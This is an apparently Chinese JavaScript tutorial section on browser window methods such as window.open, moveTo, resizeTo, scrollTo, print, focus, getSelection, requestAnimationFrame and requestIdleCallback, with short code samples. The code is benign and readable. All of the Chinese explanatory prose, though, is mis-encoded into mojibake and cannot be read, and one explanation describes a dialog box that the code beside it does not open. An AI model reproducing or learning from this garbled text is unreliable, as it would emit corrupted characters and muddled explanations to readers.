<p>å¯¹äºé‚£äº›å¯ä»¥æ‰“å¼€å’Œå…³é—­çš„å±æ€§ï¼Œè®¾ä¸º<code>yes</code>æˆ–<code>1</code>æˆ–ä¸è®¾ä»»ä½•å€¼å°±è¡¨ç¤ºæ‰“å¼€ï¼Œæ¯”å¦‚<code>status=yes</code>ã€<code>status=1</code>ã€<code>status</code>éƒ½ä¼šå¾—åˆ°åŒæ ·çš„ç»“æœã€‚å¦‚æœæƒ³è®¾ä¸ºå…³é—­ï¼Œä¸ç”¨å†™<code>no</code>ï¼Œè€Œæ˜¯ç›´æ¥çœç•¥è¿™ä¸ªå±æ€§å³å¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåœ¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­è®¾ç½®äº†ä¸€éƒ¨åˆ†å±æ€§ï¼Œå…¶ä»–æ²¡æœ‰è¢«è®¾ç½®çš„<code>yes/no</code>å±æ€§éƒ½ä¼šè¢«è®¾æˆ<code>no</code>ï¼Œåªæœ‰<code>titlebar</code>å’Œå…³é—­æŒ‰é’®é™¤å¤–ï¼ˆå®ƒä»¬çš„å€¼é»˜è®¤ä¸º<code>yes</code>ï¼‰ã€‚</p>
<p>ä¸Šé¢è¿™äº›å±æ€§ï¼Œå±æ€§åä¸å±æ€§å€¼ä¹‹é—´ç”¨ç­‰å·è¿æ¥ï¼Œå±æ€§ä¸å±æ€§ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;height&#x3D;200,width&#x3D;200,location&#x3D;no,status&#x3D;yes,resizable&#x3D;yes,scrollbars&#x3D;yes&#39;</span><br></pre></td></tr></table></figure>

<p>å¦å¤–ï¼Œ<code>open()</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°è™½ç„¶å¯ä»¥æŒ‡å®šå·²ç»å­˜åœ¨çš„çª—å£ï¼Œä½†æ˜¯ä¸ç­‰äºå¯ä»¥ä»»æ„æ§åˆ¶å…¶ä»–çª—å£ã€‚ä¸ºäº†é˜²æ­¢è¢«ä¸ç›¸å¹²çš„çª—å£æ§åˆ¶ï¼Œæµè§ˆå™¨åªæœ‰åœ¨ä¸¤ä¸ªçª—å£åŒæºï¼Œæˆ–è€…ç›®æ ‡çª—å£è¢«å½“å‰ç½‘é¡µæ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œæ‰å…è®¸<code>open</code>æ–¹æ³•æŒ‡å‘è¯¥çª—å£ã€‚</p>
<p><code>window.open</code>æ–¹æ³•è¿”å›æ–°çª—å£çš„å¼•ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var windowB &#x3D; window.open(&#39;windowB.html&#39;, &#39;WindowB&#39;);</span><br><span class="line">windowB.window.name &#x2F;&#x2F; &quot;WindowB&quot;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œå¦‚æœæ–°çª—å£å’Œçˆ¶çª—å£ä¸æ˜¯åŒæºçš„ï¼ˆå³ä¸åœ¨åŒä¸€ä¸ªåŸŸï¼‰ï¼Œå®ƒä»¬å½¼æ­¤ä¸èƒ½è·å–å¯¹æ–¹çª—å£å¯¹è±¡çš„å†…éƒ¨å±æ€§ã€‚</p>
<p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var w &#x3D; window.open();</span><br><span class="line">console.log(&#39;å·²ç»æ‰“å¼€æ–°çª—å£&#39;);</span><br><span class="line">w.location &#x3D; &#39;http:&#x2F;&#x2F;example.com&#39;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å…ˆæ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œç„¶ååœ¨è¯¥çª—å£å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå†å°†ç½‘å€å¯¼å‘<code>example.com</code>ã€‚</p>
<p>ç”±äº<code>open</code>è¿™ä¸ªæ–¹æ³•å¾ˆå®¹æ˜“è¢«æ»¥ç”¨ï¼Œè®¸å¤šæµè§ˆå™¨é»˜è®¤éƒ½ä¸å…è®¸è„šæœ¬è‡ªåŠ¨æ–°å»ºçª—å£ã€‚åªå…è®¸åœ¨ç”¨æˆ·ç‚¹å‡»é“¾æ¥æˆ–æŒ‰é’®æ—¶ï¼Œè„šæœ¬åšå‡ºååº”ï¼Œå¼¹å‡ºæ–°çª—å£ã€‚å› æ­¤ï¼Œæœ‰å¿…è¦æ£€æŸ¥ä¸€ä¸‹æ‰“å¼€æ–°çª—å£æ˜¯å¦æˆåŠŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open();</span><br><span class="line">if (popup &#x3D;&#x3D;&#x3D; null) &#123;</span><br><span class="line">  &#x2F;&#x2F; æ–°å»ºçª—å£å¤±è´¥</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰window.close()</strong></p>
<p><code>window.close</code>æ–¹æ³•ç”¨äºå…³é—­å½“å‰çª—å£ï¼Œä¸€èˆ¬åªç”¨æ¥å…³é—­<code>window.open</code>æ–¹æ³•æ–°å»ºçš„çª—å£ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popup.close()</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•åªå¯¹é¡¶å±‚çª—å£æœ‰æ•ˆï¼Œ<code>iframe</code>æ¡†æ¶ä¹‹ä¸­çš„çª—å£ä½¿ç”¨è¯¥æ–¹æ³•æ— æ•ˆã€‚</p>
<p><strong>ï¼ˆ3ï¼‰window.stop()</strong></p>
<p><code>window.stop()</code>æ–¹æ³•å®Œå…¨ç­‰åŒäºå•å‡»æµè§ˆå™¨çš„åœæ­¢æŒ‰é’®ï¼Œä¼šåœæ­¢åŠ è½½å›¾åƒã€è§†é¢‘ç­‰æ­£åœ¨æˆ–ç­‰å¾…åŠ è½½çš„å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.stop()</span><br></pre></td></tr></table></figure>

<h4 id="window-moveTo-ï¼Œwindow-moveBy"><a href="#window-moveTo-ï¼Œwindow-moveBy" class="headerlink" title="window.moveTo()ï¼Œwindow.moveBy()"></a>window.moveTo()ï¼Œwindow.moveBy()</h4><p><code>window.moveTo()</code>æ–¹æ³•ç”¨äºç§»åŠ¨æµè§ˆå™¨çª—å£åˆ°æŒ‡å®šä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯çª—å£å·¦ä¸Šè§’è·ç¦»å±å¹•å·¦ä¸Šè§’çš„æ°´å¹³è·ç¦»å’Œå‚ç›´è·ç¦»ï¼Œå•ä½ä¸ºåƒç´ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.moveTo(100, 200)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å°†çª—å£ç§»åŠ¨åˆ°å±å¹•<code>(100, 200)</code>çš„ä½ç½®ã€‚</p>
<p><code>window.moveBy()</code>æ–¹æ³•å°†çª—å£ç§»åŠ¨åˆ°ä¸€ä¸ªç›¸å¯¹ä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯çª—å£å·¦ä¸Šè§’å‘å³ç§»åŠ¨çš„æ°´å¹³è·ç¦»å’Œå‘ä¸‹ç§»åŠ¨çš„å‚ç›´è·ç¦»ï¼Œå•ä½ä¸ºåƒç´ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.moveBy(25, 50)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å°†çª—å£å‘å³ç§»åŠ¨25åƒç´ ã€å‘ä¸‹ç§»åŠ¨50åƒç´ ã€‚</p>
<p>ä¸ºäº†é˜²æ­¢æœ‰äººæ»¥ç”¨è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œéšæ„ç§»åŠ¨ç”¨æˆ·çš„çª—å£ï¼Œç›®å‰åªæœ‰ä¸€ç§æƒ…å†µï¼Œæµè§ˆå™¨å…è®¸ç”¨è„šæœ¬ç§»åŠ¨çª—å£ï¼šè¯¥çª—å£æ˜¯ç”¨<code>window.open()</code>æ–¹æ³•æ–°å»ºçš„ï¼Œå¹¶ä¸”çª—å£é‡Œåªæœ‰å®ƒä¸€ä¸ª Tab é¡µã€‚é™¤æ­¤ä»¥å¤–çš„æƒ…å†µï¼Œä½¿ç”¨ä¸Šé¢ä¸¤ä¸ªæ–¹æ³•éƒ½æ˜¯æ— æ•ˆçš„ã€‚</p>
<h4 id="window-resizeTo-ï¼Œwindow-resizeBy"><a href="#window-resizeTo-ï¼Œwindow-resizeBy" class="headerlink" title="window.resizeTo()ï¼Œwindow.resizeBy()"></a>window.resizeTo()ï¼Œwindow.resizeBy()</h4><p><code>window.resizeTo()</code>æ–¹æ³•ç”¨äºç¼©æ”¾çª—å£åˆ°æŒ‡å®šå¤§å°ã€‚</p>
<p>å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç¼©æ”¾åçš„çª—å£å®½åº¦ï¼ˆ<code>outerWidth</code>å±æ€§ï¼ŒåŒ…å«æ»šåŠ¨æ¡ã€æ ‡é¢˜æ ç­‰ç­‰ï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯ç¼©æ”¾åçš„çª—å£é«˜åº¦ï¼ˆ<code>outerHeight</code>å±æ€§ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.resizeTo(</span><br><span class="line">  window.screen.availWidth &#x2F; 2,</span><br><span class="line">  window.screen.availHeight &#x2F; 2</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å°†å½“å‰çª—å£ç¼©æ”¾åˆ°ï¼Œå±å¹•å¯ç”¨åŒºåŸŸçš„ä¸€åŠå®½åº¦å’Œé«˜åº¦ã€‚</p>
<p><code>window.resizeBy()</code>æ–¹æ³•ç”¨äºç¼©æ”¾çª—å£ã€‚å®ƒä¸<code>window.resizeTo()</code>çš„åŒºåˆ«æ˜¯ï¼Œå®ƒæŒ‰ç…§ç›¸å¯¹çš„é‡ç¼©æ”¾ï¼Œ<code>window.resizeTo()</code>éœ€è¦ç»™å‡ºç¼©æ”¾åçš„ç»å¯¹å¤§å°ã€‚</p>
<p>å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ°´å¹³ç¼©æ”¾çš„é‡ï¼Œç¬¬äºŒä¸ªæ˜¯å‚ç›´ç¼©æ”¾çš„é‡ï¼Œå•ä½éƒ½æ˜¯åƒç´ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.resizeBy(-200, -200)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç å°†å½“å‰çª—å£çš„å®½åº¦å’Œé«˜åº¦ï¼Œéƒ½ç¼©å°200åƒç´ ã€‚</p>
<h4 id="window-scrollTo-ï¼Œwindow-scroll-ï¼Œwindow-scrollBy"><a href="#window-scrollTo-ï¼Œwindow-scroll-ï¼Œwindow-scrollBy" class="headerlink" title="window.scrollTo()ï¼Œwindow.scroll()ï¼Œwindow.scrollBy()"></a>window.scrollTo()ï¼Œwindow.scroll()ï¼Œwindow.scrollBy()</h4><p><code>window.scrollTo</code>æ–¹æ³•ç”¨äºå°†æ–‡æ¡£æ»šåŠ¨åˆ°æŒ‡å®šä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºæ»šåŠ¨åä½äºçª—å£å·¦ä¸Šè§’çš„é¡µé¢åæ ‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.scrollTo(x-coord, y-coord)</span><br></pre></td></tr></table></figure>

<p>å®ƒä¹Ÿå¯ä»¥æ¥å—ä¸€ä¸ªé…ç½®å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.scrollTo(options)</span><br></pre></td></tr></table></figure>

<p>é…ç½®å¯¹è±¡<code>options</code>æœ‰ä¸‰ä¸ªå±æ€§ã€‚</p>
<ul>
<li><code>top</code>ï¼šæ»šåŠ¨åé¡µé¢å·¦ä¸Šè§’çš„å‚ç›´åæ ‡ï¼Œå³ y åæ ‡ã€‚</li>
<li><code>left</code>ï¼šæ»šåŠ¨åé¡µé¢å·¦ä¸Šè§’çš„æ°´å¹³åæ ‡ï¼Œå³ x åæ ‡ã€‚</li>
<li><code>behavior</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ»šåŠ¨çš„æ–¹å¼ï¼Œæœ‰ä¸‰ä¸ªå¯èƒ½å€¼ï¼ˆ<code>smooth</code>ã€<code>instant</code>ã€<code>auto</code>ï¼‰ï¼Œé»˜è®¤å€¼ä¸º<code>auto</code>ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.scrollTo(&#123;</span><br><span class="line">  top: 1000,</span><br><span class="line">  behavior: &#39;smooth&#39;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>window.scroll()</code>æ–¹æ³•æ˜¯<code>window.scrollTo()</code>æ–¹æ³•çš„åˆ«åã€‚</p>
<p><code>window.scrollBy()</code>æ–¹æ³•ç”¨äºå°†ç½‘é¡µæ»šåŠ¨æŒ‡å®šè·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šæ°´å¹³å‘å³æ»šåŠ¨çš„åƒç´ ï¼Œå‚ç›´å‘ä¸‹æ»šåŠ¨çš„åƒç´ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.scrollBy(0, window.innerHeight)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ç”¨äºå°†ç½‘é¡µå‘ä¸‹æ»šåŠ¨ä¸€å±ã€‚</p>
<p>å¦‚æœä¸æ˜¯è¦æ»šåŠ¨æ•´ä¸ªæ–‡æ¡£ï¼Œè€Œæ˜¯è¦æ»šåŠ¨æŸä¸ªå…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸‰ä¸ªå±æ€§å’Œæ–¹æ³•ã€‚</p>
<ul>
<li>Element.scrollTop</li>
<li>Element.scrollLeft</li>
<li>Element.scrollIntoView()</li>
</ul>
<h4 id="window-print"><a href="#window-print" class="headerlink" title="window.print()"></a>window.print()</h4><p><code>window.print</code>æ–¹æ³•ä¼šè·³å‡ºæ‰“å°å¯¹è¯æ¡†ï¼Œä¸ç”¨æˆ·ç‚¹å‡»èœå•é‡Œé¢çš„â€œæ‰“å°â€å‘½ä»¤æ•ˆæœç›¸åŒã€‚</p>
<p>å¸¸è§çš„æ‰“å°æŒ‰é’®ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&#39;printLink&#39;).onclick &#x3D; function () &#123;</span><br><span class="line">  window.print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éæ¡Œé¢è®¾å¤‡ï¼ˆæ¯”å¦‚æ‰‹æœºï¼‰å¯èƒ½æ²¡æœ‰æ‰“å°åŠŸèƒ½ï¼Œè¿™æ—¶å¯ä»¥è¿™æ ·åˆ¤æ–­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (typeof window.print &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;</span><br><span class="line">  &#x2F;&#x2F; æ”¯æŒæ‰“å°åŠŸèƒ½</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="window-focus-ï¼Œwindow-blur"><a href="#window-focus-ï¼Œwindow-blur" class="headerlink" title="window.focus()ï¼Œwindow.blur()"></a>window.focus()ï¼Œwindow.blur()</h4><p><code>window.focus()</code>æ–¹æ³•ä¼šæ¿€æ´»çª—å£ï¼Œä½¿å…¶è·å¾—ç„¦ç‚¹ï¼Œå‡ºç°åœ¨å…¶ä»–çª—å£çš„å‰é¢ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open(&#39;popup.html&#39;, &#39;Popup Window&#39;);</span><br><span class="line"></span><br><span class="line">if ((popup !&#x3D;&#x3D; null) &amp;&amp; !popup.closed) &#123;</span><br><span class="line">  popup.focus();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å…ˆæ£€æŸ¥<code>popup</code>çª—å£æ˜¯å¦ä¾ç„¶å­˜åœ¨ï¼Œç¡®è®¤åæ¿€æ´»è¯¥çª—å£ã€‚</p>
<p><code>window.blur()</code>æ–¹æ³•å°†ç„¦ç‚¹ä»çª—å£ç§»é™¤ã€‚</p>
<p>å½“å‰çª—å£è·å¾—ç„¦ç‚¹æ—¶ï¼Œä¼šè§¦å‘<code>focus</code>äº‹ä»¶ï¼›å½“å‰çª—å£å¤±å»ç„¦ç‚¹æ—¶ï¼Œä¼šè§¦å‘<code>blur</code>äº‹ä»¶ã€‚</p>
<h4 id="window-getSelection"><a href="#window-getSelection" class="headerlink" title="window.getSelection()"></a>window.getSelection()</h4><p><code>window.getSelection</code>æ–¹æ³•è¿”å›ä¸€ä¸ª<code>Selection</code>å¯¹è±¡ï¼Œè¡¨ç¤ºç”¨æˆ·ç°åœ¨é€‰ä¸­çš„æ–‡æœ¬ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var selObj &#x3D; window.getSelection();</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>Selection</code>å¯¹è±¡çš„<code>toString</code>æ–¹æ³•å¯ä»¥å¾—åˆ°é€‰ä¸­çš„æ–‡æœ¬ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var selectedText &#x3D; selObj.toString();</span><br></pre></td></tr></table></figure>

<h4 id="window-getComputedStyle-ï¼Œwindow-matchMedia"><a href="#window-getComputedStyle-ï¼Œwindow-matchMedia" class="headerlink" title="window.getComputedStyle()ï¼Œwindow.matchMedia()"></a>window.getComputedStyle()ï¼Œwindow.matchMedia()</h4><p><code>window.getComputedStyle()</code>æ–¹æ³•æ¥å—ä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«è¯¥å…ƒç´ çš„æœ€ç»ˆæ ·å¼ä¿¡æ¯çš„å¯¹è±¡ï¼Œè¯¦è§ã€ŠCSS æ“ä½œã€‹ä¸€ç« ã€‚</p>
<p><code>window.matchMedia()</code>æ–¹æ³•ç”¨æ¥æ£€æŸ¥ CSS çš„<code>mediaQuery</code>è¯­å¥ï¼Œè¯¦è§ã€ŠCSS æ“ä½œã€‹ä¸€ç« ã€‚</p>
<h4 id="window-requestAnimationFrame"><a href="#window-requestAnimationFrame" class="headerlink" title="window.requestAnimationFrame()"></a>window.requestAnimationFrame()</h4><p><code>window.requestAnimationFrame()</code>æ–¹æ³•è·Ÿ<code>setTimeout</code>ç±»ä¼¼ï¼Œéƒ½æ˜¯æ¨è¿ŸæŸä¸ªå‡½æ•°çš„æ‰§è¡Œã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œ<code>setTimeout</code>å¿…é¡»æŒ‡å®šæ¨è¿Ÿçš„æ—¶é—´ï¼Œ<code>window.requestAnimationFrame()</code>åˆ™æ˜¯æ¨è¿Ÿåˆ°æµè§ˆå™¨ä¸‹ä¸€æ¬¡é‡æµæ—¶æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡é‡ç»˜ã€‚é‡ç»˜é€šå¸¸æ˜¯ 16ms æ‰§è¡Œä¸€æ¬¡ï¼Œä¸è¿‡æµè§ˆå™¨ä¼šè‡ªåŠ¨è°ƒèŠ‚è¿™ä¸ªé€Ÿç‡ï¼Œæ¯”å¦‚ç½‘é¡µåˆ‡æ¢åˆ°åå° Tab é¡µæ—¶ï¼Œ<code>requestAnimationFrame()</code>ä¼šæš‚åœæ‰§è¡Œã€‚</p>
<p>å¦‚æœæŸä¸ªå‡½æ•°ä¼šæ”¹å˜ç½‘é¡µçš„å¸ƒå±€ï¼Œä¸€èˆ¬å°±æ”¾åœ¨<code>window.requestAnimationFrame()</code>é‡Œé¢æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥èŠ‚çœç³»ç»Ÿèµ„æºï¼Œä½¿å¾—ç½‘é¡µæ•ˆæœæ›´åŠ å¹³æ»‘ã€‚å› ä¸ºæ…¢é€Ÿè®¾å¤‡ä¼šç”¨è¾ƒæ…¢çš„é€Ÿç‡é‡æµå’Œé‡ç»˜ï¼Œè€Œé€Ÿåº¦æ›´å¿«çš„è®¾å¤‡ä¼šæœ‰æ›´å¿«çš„é€Ÿç‡ã€‚</p>
<p>è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.requestAnimationFrame(callback)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>callback</code>æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚<code>callback</code>æ‰§è¡Œæ—¶ï¼Œå®ƒçš„å‚æ•°å°±æ˜¯ç³»ç»Ÿä¼ å…¥çš„ä¸€ä¸ªé«˜ç²¾åº¦æ—¶é—´æˆ³ï¼ˆ<code>performance.now()</code>çš„è¿”å›å€¼ï¼‰ï¼Œå•ä½æ˜¯æ¯«ç§’ï¼Œè¡¨ç¤ºè·ç¦»ç½‘é¡µåŠ è½½çš„æ—¶é—´ã€‚</p>
<p><code>window.requestAnimationFrame()</code>çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¿™ä¸ªæ•´æ•°å¯ä»¥ä¼ å…¥<code>window.cancelAnimationFrame()</code>ï¼Œç”¨æ¥å–æ¶ˆå›è°ƒå‡½æ•°çš„æ‰§è¡Œã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ª<code>window.requestAnimationFrame()</code>æ‰§è¡Œç½‘é¡µåŠ¨ç”»çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var element &#x3D; document.getElementById(&#39;animate&#39;);</span><br><span class="line">element.style.position &#x3D; &#39;absolute&#39;;</span><br><span class="line"></span><br><span class="line">var start &#x3D; null;</span><br><span class="line"></span><br><span class="line">function step(timestamp) &#123;</span><br><span class="line">  if (!start) start &#x3D; timestamp;</span><br><span class="line">  var progress &#x3D; timestamp - start;</span><br><span class="line">  &#x2F;&#x2F; å…ƒç´ ä¸æ–­å‘å·¦ç§»ï¼Œæœ€å¤§ä¸è¶…è¿‡200åƒç´ </span><br><span class="line">  element.style.left &#x3D; Math.min(progress &#x2F; 10, 200) + &#39;px&#39;;</span><br><span class="line">  &#x2F;&#x2F; å¦‚æœè·ç¦»ç¬¬ä¸€æ¬¡æ‰§è¡Œä¸è¶…è¿‡ 2000 æ¯«ç§’ï¼Œ</span><br><span class="line">  &#x2F;&#x2F; å°±ç»§ç»­æ‰§è¡ŒåŠ¨ç”»</span><br><span class="line">  if (progress &lt; 2000) &#123;</span><br><span class="line">    window.requestAnimationFrame(step);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.requestAnimationFrame(step);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å®šä¹‰äº†ä¸€ä¸ªç½‘é¡µåŠ¨ç”»ï¼ŒæŒç»­æ—¶é—´æ˜¯2ç§’ï¼Œä¼šè®©å…ƒç´ å‘å³ç§»åŠ¨ã€‚</p>
<h4 id="window-requestIdleCallback"><a href="#window-requestIdleCallback" class="headerlink" title="window.requestIdleCallback()"></a>window.requestIdleCallback()</h4><p><code>window.requestIdleCallback()</code>è·Ÿ<code>setTimeout</code>ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å°†æŸä¸ªå‡½æ•°æ¨è¿Ÿæ‰§è¡Œï¼Œä½†æ˜¯å®ƒä¿è¯å°†å›è°ƒå‡½æ•°æ¨è¿Ÿåˆ°ç³»ç»Ÿèµ„æºç©ºé—²æ—¶æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸä¸ªä»»åŠ¡ä¸æ˜¯å¾ˆå…³é”®ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>window.requestIdleCallback()</code>å°†å…¶æ¨è¿Ÿæ‰§è¡Œï¼Œä»¥ä¿è¯ç½‘é¡µæ€§èƒ½ã€‚</p>
<p>å®ƒè·Ÿ<code>window.requestAnimationFrame()</code>çš„åŒºåˆ«åœ¨äºï¼Œåè€…æŒ‡å®šå›è°ƒå‡½æ•°åœ¨ä¸‹ä¸€æ¬¡æµè§ˆå™¨é‡æ’æ—¶æ‰§è¡Œï¼Œé—®é¢˜åœ¨äºä¸‹ä¸€æ¬¡é‡æ’æ—¶ï¼Œç³»ç»Ÿèµ„æºæœªå¿…ç©ºé—²ï¼Œä¸ä¸€å®šèƒ½ä¿è¯åœ¨16æ¯«ç§’ä¹‹å†…å®Œæˆï¼›<code>window.requestIdleCallback()</code>å¯ä»¥ä¿è¯å›è°ƒå‡½æ•°åœ¨ç³»ç»Ÿèµ„æºç©ºé—²æ—¶æ‰§è¡Œã€‚</p>
<p>è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°å’Œä¸€ä¸ªé…ç½®å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚é…ç½®å¯¹è±¡å¯ä»¥æŒ‡å®šä¸€ä¸ªæ¨è¿Ÿæ‰§è¡Œçš„æœ€é•¿æ—¶é—´ï¼Œå¦‚æœè¿‡äº†è¿™ä¸ªæ—¶é—´ï¼Œå›è°ƒå‡½æ•°ä¸ç®¡ç³»ç»Ÿèµ„æºæœ‰æ— ç©ºé—²ï¼Œéƒ½ä¼šæ‰§è¡Œã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.requestIdleCallback(callback[, options])</span><br></pre></td></tr></table></figure>

<p><code>callback</code>å‚æ•°æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚è¯¥å›è°ƒå‡½æ•°æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šä¼ å…¥ä¸€ä¸ª<code>IdleDeadline</code>å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚<code>IdleDeadline</code>å¯¹è±¡æœ‰ä¸€ä¸ª<code>didTimeout</code>å±æ€§ï¼ˆå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦ä¸ºè¶…æ—¶è°ƒç”¨ï¼‰å’Œä¸€ä¸ª<code>timeRemaining()</code>æ–¹æ³•ï¼ˆè¿”å›è¯¥ç©ºé—²æ—¶æ®µå‰©ä½™çš„æ¯«ç§’æ•°ï¼‰ã€‚</p>
